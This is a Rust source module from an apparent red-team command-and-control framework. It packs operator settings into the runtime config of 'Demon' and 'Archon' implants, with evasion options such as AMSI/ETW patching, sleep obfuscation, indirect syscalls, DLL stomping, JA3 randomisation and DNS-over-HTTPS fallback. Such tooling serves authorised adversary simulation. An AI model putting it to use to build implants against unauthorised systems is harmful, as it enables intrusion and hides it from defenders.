//! Demon agent configuration packing.
//!
//! This module merges operator-supplied build request fields with profile
//! defaults and serialises the resulting config into the compact binary layout
//! the Demon (and Archon) implant expects at runtime.

use red_cell_common::config::DemonConfig;
use red_cell_common::{HttpListenerConfig, ListenerConfig};
use serde_json::{Map, Value};

use super::PayloadBuildError;
use super::config_values::{
    add_bytes, add_u32, add_u64, add_wstring, amsi_patch_value, injection_mode, optional_bool,
    optional_string, parse_kill_date, parse_working_hours, proxy_loading_value, proxy_url,
    required_object, required_string, required_u32, sleep_jump_bypass, sleep_obfuscation_value,
};

/// HTTP methods that the Demon implant supports for C2 callbacks.
///
/// Demon callbacks carry an encrypted body, so only methods that allow a
/// request body are valid.  The Havoc reference implementation uses POST
/// exclusively; extend this list only after verifying Demon-side support.
const DEMON_SUPPORTED_HTTP_METHODS: &[&str] = &["POST"];

/// Merge the operator-supplied build-request JSON with profile-level defaults.
///
/// The operator JSON takes precedence: any key already present is kept as-is.
/// Missing keys are filled from the [`DemonConfig`] defaults parsed from the
/// HCL profile.
pub(crate) fn merged_request_config(
    input: &str,
    agent_name: &str,
    defaults: &DemonConfig,
) -> Result<Map<String, Value>, PayloadBuildError> {
    let mut config = match serde_json::from_str::<Value>(input)? {
        Value::Object(map) => map,
        _ => {
            return Err(PayloadBuildError::InvalidRequest {
                message: "build config must be a JSON object".to_owned(),
            });
        }
    };

    insert_default_string(&mut config, "Sleep", defaults.sleep.map(|value| value.to_string()));
    insert_default_string(&mut config, "Jitter", defaults.jitter.map(|value| value.to_string()));
    insert_default_bool(&mut config, "Indirect Syscall", defaults.indirect_syscall);
    insert_default_bool(&mut config, "Stack Duplication", defaults.stack_duplication);
    insert_default_string(&mut config, "Sleep Technique", defaults.sleep_technique.clone());
    insert_default_string(&mut config, "Proxy Loading", defaults.proxy_loading.clone());
    // ARC-01: Archon defaults to process-wide memory patching when the profile
    // does not specify AmsiEtw.  Demon has no persistent patch and keeps the
    // previous default of none (0).
    let amsi_default = if agent_name == "archon" {
        defaults.amsi_etw_patching.clone().or_else(|| Some("patch".to_owned()))
    } else {
        defaults.amsi_etw_patching.clone()
    };
    insert_default_string(&mut config, "Amsi/Etw Patch", amsi_default);
    // ARC-04: HeapEnc defaults to true; propagate the profile value so that
    // an explicit `HeapEnc = false` reaches pack_config.
    if !config.contains_key("HeapEnc") {
        config.insert("HeapEnc".to_owned(), Value::Bool(defaults.heap_enc));
    }
    // ARC-09: JobExecution — Archon-only, propagate profile default.
    if agent_name == "archon" && !config.contains_key("JobExecution") {
        config.insert("JobExecution".to_owned(), Value::String(defaults.job_execution.clone()));
    }
    // ARC-05: StompDll — Archon-only optional victim DLL name.
    if agent_name == "archon" && !config.contains_key("StompDll") {
        if let Some(stomp_dll) = &defaults.stomp_dll {
            config.insert("StompDll".to_owned(), Value::String(stomp_dll.clone()));
        }
    }
    if let Some(injection) = &defaults.injection {
        let entry =
            config.entry("Injection".to_owned()).or_insert_with(|| Value::Object(Map::new()));
        if let Value::Object(map) = entry {
            if !map.contains_key("Spawn64") {
                if let Some(spawn64) = &injection.spawn64 {
                    map.insert("Spawn64".to_owned(), Value::String(spawn64.clone()));
                }
            }
            if !map.contains_key("Spawn32") {
                if let Some(spawn32) = &injection.spawn32 {
                    map.insert("Spawn32".to_owned(), Value::String(spawn32.clone()));
                }
            }
        }
    }

    Ok(config)
}

fn insert_default_string(config: &mut Map<String, Value>, key: &str, value: Option<String>) {
    if !config.contains_key(key) {
        if let Some(value) = value {
            config.insert(key.to_owned(), Value::String(value));
        }
    }
}

fn insert_default_bool(config: &mut Map<String, Value>, key: &str, value: bool) {
    if value && !config.contains_key(key) {
        config.insert(key.to_owned(), Value::Bool(true));
    }
}

/// Pack the merged Demon config and listener settings into the binary layout
/// expected by the Demon agent at runtime.
pub(crate) fn pack_config(
    listener: &ListenerConfig,
    config: &Map<String, Value>,
) -> Result<Vec<u8>, PayloadBuildError> {
    let sleep = required_u32(config, "Sleep")?;
    let jitter = required_u32(config, "Jitter")?;
    if jitter > 100 {
        return Err(PayloadBuildError::InvalidRequest {
            message: "Jitter has to be between 0 and 100".to_owned(),
        });
    }

    let mut out = Vec::new();
    add_u32(&mut out, sleep);
    add_u32(&mut out, jitter);

    let injection = required_object(config, "Injection")?;
    add_u32(&mut out, injection_mode(injection, "Alloc")?);
    add_u32(&mut out, injection_mode(injection, "Execute")?);
    add_wstring(&mut out, required_string(injection, "Spawn64")?)?;
    add_wstring(&mut out, required_string(injection, "Spawn32")?)?;

    let obfuscation =
        sleep_obfuscation_value(optional_string(config, "Sleep Technique").unwrap_or_default());
    add_u32(&mut out, obfuscation);
    add_u32(&mut out, sleep_jump_bypass(obfuscation, optional_string(config, "Sleep Jmp Gadget"))?);
    add_u32(
        &mut out,
        if obfuscation == 0 {
            0
        } else if optional_bool(config, "Stack Duplication").unwrap_or(false) {
            1
        } else {
            0
        },
    );
    add_u32(&mut out, proxy_loading_value(optional_string(config, "Proxy Loading")));
    add_u32(
        &mut out,
        if optional_bool(config, "Indirect Syscall").unwrap_or(false) { 1 } else { 0 },
    );
    add_u32(&mut out, amsi_patch_value(optional_string(config, "Amsi/Etw Patch")));

    // ARC-04: heap encryption during sleep — default ON.
    add_u32(&mut out, if optional_bool(config, "HeapEnc").unwrap_or(true) { 1 } else { 0 });

    // ARC-09: job execution mode — 0 = dedicated thread (default), 1 = NT thread pool.
    add_u32(
        &mut out,
        if optional_string(config, "JobExecution")
            .unwrap_or("thread")
            .eq_ignore_ascii_case("threadpool")
        {
            1
        } else {
            0
        },
    );

    // ARC-05: StompDll — length-prefixed UTF-16LE wstring; empty = auto-select.
    add_wstring(&mut out, optional_string(config, "StompDll").unwrap_or(""))?;

    match listener {
        ListenerConfig::Http(http) => pack_http_listener(&mut out, http)?,
        ListenerConfig::Smb(smb) => pack_smb_listener(&mut out, smb)?,
        ListenerConfig::Dns(_) | ListenerConfig::External(_) => {
            return Err(PayloadBuildError::InvalidRequest {
                message: format!(
                    "{} listeners are not supported for Demon payload builds",
                    listener.protocol()
                ),
            });
        }
    }
    Ok(out)
}

fn pack_http_listener(
    out: &mut Vec<u8>,
    config: &HttpListenerConfig,
) -> Result<(), PayloadBuildError> {
    let port = config.port_conn.unwrap_or(config.port_bind);
    add_u64(out, parse_kill_date(config.kill_date.as_deref())?);
    add_u32(out, parse_working_hours(config.working_hours.as_deref())? as u32);

    let method = config.method.as_deref().unwrap_or("POST");
    if !DEMON_SUPPORTED_HTTP_METHODS.iter().any(|&m| method.eq_ignore_ascii_case(m)) {
        return Err(PayloadBuildError::InvalidRequest {
            message: format!(
                "HTTP method `{method}` is not supported for Demon payloads; \
                 supported: {}",
                DEMON_SUPPORTED_HTTP_METHODS.join(", ")
            ),
        });
    }
    add_wstring(out, &method.to_ascii_uppercase())?;
    add_u32(out, if config.host_rotation.eq_ignore_ascii_case("round-robin") { 0 } else { 1 });

    add_u32(
        out,
        u32::try_from(config.hosts.len()).map_err(|_| PayloadBuildError::InvalidRequest {
            message: "too many listener hosts configured".to_owned(),
        })?,
    );
    for host in &config.hosts {
        let (host_name, host_port) = host
            .rsplit_once(':')
            .and_then(|(host_name, port)| port.parse::<u16>().ok().map(|port| (host_name, port)))
            .unwrap_or((host.as_str(), port));
        add_wstring(out, host_name)?;
        add_u32(out, u32::from(host_port));
    }

    add_u32(out, if config.secure { 1 } else { 0 });
    add_wstring(out, config.user_agent.as_deref().unwrap_or_default())?;

    let mut headers = if config.headers.is_empty() {
        vec!["Content-type: */*".to_owned()]
    } else {
        config.headers.clone()
    };
    if let Some(host_header) = &config.host_header {
        headers.push(format!("Host: {host_header}"));
    }
    add_u32(
        out,
        u32::try_from(headers.len()).map_err(|_| PayloadBuildError::InvalidRequest {
            message: "too many HTTP headers configured".to_owned(),
        })?,
    );
    for header in headers {
        add_wstring(out, &header)?;
    }

    let uris = if config.uris.is_empty() { vec!["/".to_owned()] } else { config.uris.clone() };
    add_u32(
        out,
        u32::try_from(uris.len()).map_err(|_| PayloadBuildError::InvalidRequest {
            message: "too many URIs configured".to_owned(),
        })?,
    );
    for uri in uris {
        add_wstring(out, &uri)?;
    }

    match &config.proxy {
        Some(proxy) if proxy.enabled => {
            add_u32(out, 1);
            add_wstring(out, &proxy_url(proxy))?;
            add_wstring(out, proxy.username.as_deref().unwrap_or_default())?;
            add_wstring(out, proxy.password.as_deref().map(|s| s.as_str()).unwrap_or_default())?;
        }
        _ => add_u32(out, 0),
    }

    // ARC-06: JA3/JA3S fingerprint randomization flag.
    // Defaults to true for HTTPS listeners (the only transport where JA3
    // fingerprinting is relevant), false for plain HTTP.
    add_u32(out, if config.ja3_randomize.unwrap_or(config.secure) { 1 } else { 0 });

    // ARC-08: DoH fallback transport fields.
    // Always packed so that the binary layout is stable regardless of whether
    // the agent was compiled with TRANSPORT_DOH.  The agent only reads these
    // bytes when TRANSPORT_DOH is defined.
    // Domain: length-prefixed raw ASCII bytes (empty = DoH disabled).
    add_bytes(out, config.doh_domain.as_deref().unwrap_or("").as_bytes())?;
    // Provider: 0 = Cloudflare (default), 1 = Google.
    add_u32(
        out,
        match config.doh_provider.as_deref().unwrap_or("cloudflare") {
            p if p.eq_ignore_ascii_case("google") => 1,
            _ => 0,
        },
    );

    Ok(())
}

fn pack_smb_listener(
    out: &mut Vec<u8>,
    config: &red_cell_common::SmbListenerConfig,
) -> Result<(), PayloadBuildError> {
    add_wstring(out, &format!(r"\\.\pipe\{}", config.pipe_name))?;
    add_u64(out, parse_kill_date(config.kill_date.as_deref())?);
    add_u32(out, parse_working_hours(config.working_hours.as_deref())? as u32);
    Ok(())
}
